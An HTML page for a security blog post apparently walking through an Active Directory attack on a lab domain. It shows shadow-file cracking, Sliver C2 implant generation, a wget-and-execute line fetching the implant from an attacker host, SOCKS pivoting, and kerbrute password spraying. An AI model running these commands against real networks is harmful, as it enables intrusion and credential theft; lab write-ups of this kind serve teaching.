@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Exploring Active Directory · pwnbuffer
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="pwnbuffer">
+<meta name="description" content="Active Directory">
+<meta name="keywords" content="team brazuca!">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Exploring Active Directory">
+  <meta name="twitter:description" content="Active Directory">
+
+<meta property="og:url" content="https://pwnbuffer.github.io/posts/mount/adxpl/">
+  <meta property="og:site_name" content="pwnbuffer">
+  <meta property="og:title" content="Exploring Active Directory">
+  <meta property="og:description" content="Active Directory">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-10T00:00:00+00:00">
+    <meta property="article:tag" content="Networks">
+    <meta property="article:tag" content="Activedirectory">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Vulnerability-Exploitation">
+
+
+
+
+<link rel="canonical" href="https://pwnbuffer.github.io/posts/mount/adxpl/">
+
+
+<link rel="preload" href="https://pwnbuffer.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://pwnbuffer.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="https://pwnbuffer.github.io/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.github.io/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="https://pwnbuffer.github.io/img/favicon-32x32.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="https://pwnbuffer.github.io/img/favicon-16x16.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://pwnbuffer.github.io/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.github.io/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://pwnbuffer.github.io/site.webmanifest">
+<link rel="mask-icon" href="https://pwnbuffer.github.io/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://pwnbuffer.github.io/">
+      pwnbuffer
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/categories/">Categories</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/members/">Members</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://pwnbuffer.github.io/pt-br/posts/mount/adxpl/">🇧🇷</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://pwnbuffer.github.io/posts/mount/adxpl/">
+              Exploring Active Directory
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-03-10T00:00:00Z">
+                March 10, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              15-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.github.io/authors/mount/">Mount</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.github.io/categories/windows/">Windows</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.github.io/categories/networks/">Networks</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.github.io/categories/protocols/">Protocols</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://pwnbuffer.github.io/tags/networks/">Networks</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.github.io/tags/activedirectory/">Activedirectory</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.github.io/tags/windows/">Windows</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.github.io/tags/vulnerability-exploitation/">Vulnerability-Exploitation</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h2 id="1-introduction">
+  1. introduction
+  <a class="heading-link" href="#1-introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Active Directory (<strong>AD</strong>) is a tool for network administrators, enabling the creation and management of domains, users and objects within a corporate network. Through AD, it is possible to connect all machines to a DC (<strong>Domain Controler</strong>) server.
+to a DC (<strong>Domain Controler</strong>) server which authenticates users using the kerberos protocol.</p>
+<p><em><strong>For example</strong></em>, an administrator can create a group of users within the corp.local domain and grant them specific privileges to access folders or internal systems. As the network grows, Active Directory makes it easier to organize large volumes of users and devices into logical groups, ensuring fine-grained control over permissions and access.</p>
+<p>Active Directory is organized as follows:</p>
+<ol>
+<li><strong>Domain</strong></li>
+<li><strong>Tree</strong></li>
+<li><strong>Forest</strong></li>
+</ol>
+<h2 id="21-domain">
+  2.1 Domain
+  <a class="heading-link" href="#21-domain">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>A domain is a logical grouping of objects (users, computers, printers, etc.) that share the same database. All resources within a domain follow the rules established by the administrator.</p>
+<p><strong>Example</strong>: The <code>corp.local</code> domain can contain users such as <span style='color: yellow;'><em>joao@corp.local</em></span>, <span style='color: yellow;'><em>ana@corp.local</em></span> and devices such as <span style='color: yellow;'><em>servidor1.corp.local</em></span>.</p>
+<h2 id="22-tree">
+  2.2 Tree
+  <a class="heading-link" href="#22-tree">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>A tree is a collection of domains that share a continuous namespace. Within the tree, the domains have hierarchical and trust relationships with each other.</p>
+<p>Example: Within the corp.local tree, we can have secondary domains such as:</p>
+<ul>
+<li><em><strong>ti.corp.local</strong></em> (for the IT team)</li>
+<li><em><strong>finance.corp.local</strong></em> (for the finance department)</li>
+<li><em><strong>marketing.corp.local</strong></em> (for the marketing team)</li>
+</ul>
+<h2 id="23-forest">
+  2.3 Forest
+  <a class="heading-link" href="#23-forest">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>The forest represents the highest level of the <code>Active Directory</code> hierarchy. It is made up of multiple trees that share a common security scheme and configuration, but can have distinct and independent domains.</p>
+<p>Example: A multinational company may have a forest containing different trees:</p>
+<ul>
+<li><em><strong>corp.local</strong></em> (for the head office)</li>
+<li><em><strong>europe.corp.local</strong></em> (for operations in Europe)</li>
+<li><em><strong>asia.corp.local</strong></em> (for operations in Asia)</li>
+</ul>
+<p><img alt="ad" src="https://pwnbuffer.github.io/images/mount/ADxpl/img1.webp"></p>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>in a scenario in which an attacker manages to compromise an entry point within the target network
+either by exploiting an open Internet service, obtaining vpn passwords or by phishing
+the internal reconnaissance process is initiated, the objective in question is to compromise the DC <strong>a.k.a</strong> <code>Domain Controler</code>
+and become <code>Domain Admin</code>.</p>
+<p>In our hypothetical scenario, the server “<em><strong>server-501</strong></em>” is used as a gateway to the network.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># lastlog</span>
+</span></span><span style="display:flex;"><span>root             tty1                 <span style="color:#3677a9">5</span>                             Fri Mar  <span style="color:#3677a9">7</span> 11:20:55 -0600 <span style="color:#3677a9">2025</span>
+</span></span><span style="display:flex;"><span>bin                                                                 **Never logged in**
+</span></span><span style="display:flex;"><span>daemon                                                              **Never logged in**
+</span></span><span style="display:flex;"><span>adm                                                                 **Never logged in**
+</span></span><span style="display:flex;"><span>lp                                                                  **Never logged in**
+</span></span><span style="display:flex;"><span>sync                                                                **Never logged in**
+</span></span><span style="display:flex;"><span>shutdown                                                            **Never logged in**
+</span></span><span style="display:flex;"><span>halt                                                                **Never logged in**
+</span></span><span style="display:flex;"><span>mail                                                                **Never logged in**
+</span></span><span style="display:flex;"><span>postfix                                                             **Never logged in**
+</span></span><span style="display:flex;"><span>gdm              tty1                                               Wed Jun <span style="color:#3677a9">12</span> 15:33:27 -0600 <span style="color:#3677a9">2024</span>
+</span></span><span style="display:flex;"><span>sshd                                                                **Never logged in**
+</span></span><span style="display:flex;"><span>chrony                                                              **Never logged in**
+</span></span><span style="display:flex;"><span>tcpdump                                                             **Never logged in**
+</span></span><span style="display:flex;"><span>rose             pts/3    10.10.11.252                              Sat Nov  <span style="color:#3677a9">9</span> 12:21:01 -0600 <span style="color:#3677a9">2024</span>
+</span></span><span style="display:flex;"><span>mysql                                                               **Never logged in**
+</span></span><span style="display:flex;"><span>nginx                                                               **Never logged in**
+</span></span><span style="display:flex;"><span>zabbix                                                              **Never logged in**
+</span></span></code></pre></div><p>user rose logged on to the machine in <strong>november 2024</strong>
+this information will be useful to us.</p>
+<p>Let&rsquo;s break the hash of user rose:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># cat /etc/passwd; echo &#34;\r\n&#34; ; cat /etc/shadow </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@kali: /home/Documents
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># unshadow passwd shadow &gt; unshadowed.txt</span>
+</span></span><span style="display:flex;"><span>john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+</span></span><span style="display:flex;"><span>KxEPkKe6R8su            (rose)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// getting the routes 
+</span></span><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># route                                                                                                                </span>
+</span></span><span style="display:flex;"><span>Kernel IP routing table
+</span></span><span style="display:flex;"><span>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+</span></span><span style="display:flex;"><span>default         10.10.0.0       0.0.0.0         UG    <span style="color:#3677a9">100</span>    <span style="color:#3677a9">0</span>        <span style="color:#3677a9">0</span> eth0
+</span></span><span style="display:flex;"><span>10.10.0.0       0.0.0.0         255.255.0.0     U     <span style="color:#3677a9">0</span>      <span style="color:#3677a9">0</span>        <span style="color:#3677a9">0</span> eth0
+</span></span><span style="display:flex;"><span>172.17.0.0      0.0.0.0         255.255.0.0     U     <span style="color:#3677a9">0</span>      <span style="color:#3677a9">0</span>        <span style="color:#3677a9">0</span> docker0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// listing
+</span></span><span style="display:flex;"><span>root@server-501# ./nmap -sn 10.10.0-255.1/24 | grep report | cut -d <span style="color:#ed9d13">&#39; &#39;</span> -f <span style="color:#3677a9">5</span> 
+</span></span><span style="display:flex;"><span>10.10.10.2
+</span></span><span style="display:flex;"><span>10.10.10.3
+</span></span><span style="display:flex;"><span>10.10.10.245
+</span></span><span style="display:flex;"><span>10.10.11.10
+</span></span><span style="display:flex;"><span>10.10.11.24
+</span></span><span style="display:flex;"><span>10.10.11.31
+</span></span><span style="display:flex;"><span>10.10.11.37
+</span></span><span style="display:flex;"><span>10.10.11.38
+</span></span><span style="display:flex;"><span>10.10.11.39
+</span></span><span style="display:flex;"><span>10.10.11.40
+</span></span><span style="display:flex;"><span>10.10.11.41
+</span></span><span style="display:flex;"><span>10.10.11.42
+</span></span><span style="display:flex;"><span>10.10.11.43
+</span></span><span style="display:flex;"><span>10.10.11.44
+</span></span><span style="display:flex;"><span>10.10.11.45
+</span></span><span style="display:flex;"><span>10.10.11.46
+</span></span><span style="display:flex;"><span>10.10.11.47
+</span></span><span style="display:flex;"><span>10.10.11.48
+</span></span><span style="display:flex;"><span>10.10.11.49
+</span></span><span style="display:flex;"><span>10.10.11.50
+</span></span><span style="display:flex;"><span>10.10.11.51
+</span></span><span style="display:flex;"><span>10.10.14.1
+</span></span><span style="display:flex;"><span>10.10.14.227
+</span></span></code></pre></div><p>as you can see, the main network route is <code>10.10.0.0/16</code>
+before we start enumerating the services let&rsquo;s start our <a href="https://sliver.sh/"  class="external-link" target="_blank" rel="noopener"><code>C2 Sliver</code></a></p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: /home/kali/Documents
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># service sliver start                                                                                                              </span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>root@kali: /home/kali/Documents
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># sliver                                                                                                                            </span>
+</span></span><span style="display:flex;"><span>Connecting to localhost:31337 ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
+</span></span><span style="display:flex;"><span>        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
+</span></span><span style="display:flex;"><span>        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
+</span></span><span style="display:flex;"><span>          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
+</span></span><span style="display:flex;"><span>        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
+</span></span><span style="display:flex;"><span>        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
+</span></span><span style="display:flex;"><span>        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
+</span></span><span style="display:flex;"><span>        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
+</span></span><span style="display:flex;"><span>                  ░      ░  ░ ░        ░     ░  ░   ░
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>All hackers gain recover
+</span></span><span style="display:flex;"><span>[*] Server v1.5.42 - 235230d05ec472851023dbcb871ddee2eb9e3df
+</span></span><span style="display:flex;"><span>[*] Welcome to the sliver shell, please <span style="color:#24909d">type</span> <span style="color:#ed9d13">&#39;help&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Check <span style="color:#6ab825;font-weight:bold">for</span> updates with the <span style="color:#ed9d13">&#39;update&#39;</span> <span style="color:#24909d">command</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sliver &gt;  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// our goal here is to create a sliver payload <span style="color:#6ab825;font-weight:bold">for</span> the linux system to make pivoting easier
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sliver &gt; mtls 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Starting mTLS listener ...
+</span></span><span style="display:flex;"><span>[*] Successfully started job <span style="color:#999;font-style:italic">#1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sliver &gt; <span style="color:#24909d">jobs</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> ID   Name   Protocol   Port   Stage <span style="color:#40ffff">Profile</span> 
+</span></span><span style="display:flex;"><span>==== ====== ========== ====== ===============
+</span></span><span style="display:flex;"><span> <span style="color:#3677a9">1</span>    mtls   tcp        <span style="color:#3677a9">8888</span>                 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sliver &gt; generate --mtls 10.10.14.227:8888 --os linux --arch amd64 --evasion --format elf --save /tmp --seconds <span style="color:#3677a9">5</span> --jitter <span style="color:#3677a9">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Generating new linux/amd64 beacon implant binary (5s)
+</span></span><span style="display:flex;"><span>[*] Symbol obfuscation is enabled
+</span></span><span style="display:flex;"><span>[*] Build completed in 21s
+</span></span><span style="display:flex;"><span>[*] Implant saved to /tmp/CLASSIC_JUDGE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>//downloading sliver payload to the machine
+</span></span><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># wget 10.10.14.227/CLASSIC_JUDGE -O /tmp/xfile ; chmod +x /tmp/xfile; /tmp/xfile &amp;  </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// incoming connection
+</span></span><span style="display:flex;"><span>[*] Beacon a42ca296 CLASSIC_JUDGE - 10.10.14.227:32876 (server-501) - linux/amd64 - Sat, <span style="color:#3677a9">02</span> Mar <span style="color:#3677a9">2025</span> 10:25:13 EST
+</span></span><span style="display:flex;"><span>sliver &gt; use a42ca296
+</span></span><span style="display:flex;"><span>[*] Active beacon CLASSIC_JUDGE (a42ca296-7f35-4379-8d47-c42dba27ef64)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// let<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s start a socks proxy to communicate with the internal network
+</span></span><span style="display:flex;"><span>sliver (CLASSIC_JUDGE) &gt;socks5 start
+</span></span><span style="display:flex;"><span>[*] Started SOCKS5 127.0.0.1 <span style="color:#3677a9">1081</span>
+</span></span><span style="display:flex;"><span>In-band SOCKS proxies can be a little unstable depending on protocol
+</span></span></code></pre></div><p>perfect now we can start enumerating the <strong>smbs</strong> and <strong>windows</strong> on the network</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: /home/kali/Documents
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># proxychains -q netexec smb hosts.txt                                                                                                                     </span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.45     <span style="color:#3677a9">445</span>    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">19282</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.39     <span style="color:#3677a9">445</span>    SERVER-301               [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2016</span> Build <span style="color:#3677a9">11825</span> x64 (name:SERVER-301) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                               
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#3677a9">445</span>    SERVER-95             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2012</span> Build <span style="color:#3677a9">26201</span> x64 (name:SERVER-95) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                              
+</span></span><span style="display:flex;"><span>SMB         10.10.11.24     <span style="color:#3677a9">445</span>    SERVER-451             [*] Windows Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">20348</span> x64 (name:SERVER-451) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                                       
+</span></span><span style="display:flex;"><span>SMB         10.10.11.42     <span style="color:#3677a9">445</span>    SERVER-651               [*] Windows Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">20348</span> x64 (name:SERVER-651) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.31     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:152) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                            
+</span></span><span style="display:flex;"><span>SMB         10.10.10.3      <span style="color:#3677a9">445</span>    LAME             [*] Unix (name:LAME) (domain:sequel.htb) (signing:False) (SMBv1:True)
+</span></span></code></pre></div><p>we can see that the <strong>DomainControler</strong> ip is <code>10.10.11.51</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@server-501# ./nmap -v --open -sS -sV 10.10.11.51
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-08 23:56:36Z)
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style="color:#3677a9">2019</span> 15.00.2000
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>Remember <strong>Rose&rsquo;s password</strong> we took? Let&rsquo;s try to use her</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@server-501# ./kerbrute userenum -d sequel.htb --dc 10.10.11.51 usuarios.txt                           
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ed9d13">\/</span> ___/ __ <span style="color:#ed9d13">\/</span> ___/ / / / __/ _ <span style="color:#ed9d13">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ed9d13">\_</span>__/_/  /_.___/_/   <span style="color:#ed9d13">\_</span>_,_/<span style="color:#ed9d13">\_</span>_/<span style="color:#ed9d13">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 (9dad6e1) - 03/08/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/03/08 19:18:53 &gt;  Using KDC(s):
+</span></span><span style="display:flex;"><span>2025/03/08 19:18:53 &gt;   10.10.11.51:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/03/08 19:18:53 &gt;  [+] VALID USERNAME:       administrator@sequel.htb
+</span></span><span style="display:flex;"><span>2025/03/08 19:18:53 &gt;  [+] VALID USERNAME:       rose@sequel.htb
+</span></span><span style="display:flex;"><span>2025/03/08 19:18:53 &gt;  Done! Tested <span style="color:#3677a9">14</span> usernames (<span style="color:#3677a9">2</span> valid) in 0.449 seconds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// the rose user exists on the domain this is good <span style="color:#6ab825;font-weight:bold">for</span> us
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@server-501# ./kerbrute passwordspray -d sequel.htb --dc 10.10.11.51 usuarios.txt <span style="color:#ed9d13">&#34;KxEPkKe6R8su&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ed9d13">\/</span> ___/ __ <span style="color:#ed9d13">\/</span> ___/ / / / __/ _ <span style="color:#ed9d13">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ed9d13">\_</span>__/_/  /_.___/_/   <span style="color:#ed9d13">\_</span>_,_/<span style="color:#ed9d13">\_</span>_/<span style="color:#ed9d13">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 (9dad6e1) - 03/08/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/03/08 19:20:09 &gt;  Using KDC(s):
+</span></span><span style="display:flex;"><span>2025/03/08 19:20:09 &gt;   10.10.11.51:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/03/08 19:20:10 &gt;  [+] VALID LOGIN:  rose@sequel.htb:KxEPkKe6R8su
+</span></span><span style="display:flex;"><span>2025/03/08 19:20:10 &gt;  Done! Tested <span style="color:#3677a9">14</span> logins (<span style="color:#3677a9">1</span> successes) in 0.903 seconds
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>// and lucky <span style="color:#6ab825;font-weight:bold">for</span> us the password matches the linux credentials
+</span></span><span style="display:flex;"><span>// but we have no privileges 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@kali: /home/kali/Documents
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># proxychains -q netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su -d sequel.htb                                                                     [19:20:10]</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] sequel.htb<span style="color:#ed9d13">\r</span>ose:KxEPkKe6R8su 
+</span></span></code></pre></div><p>let&rsquo;s start our user enumeration</p>
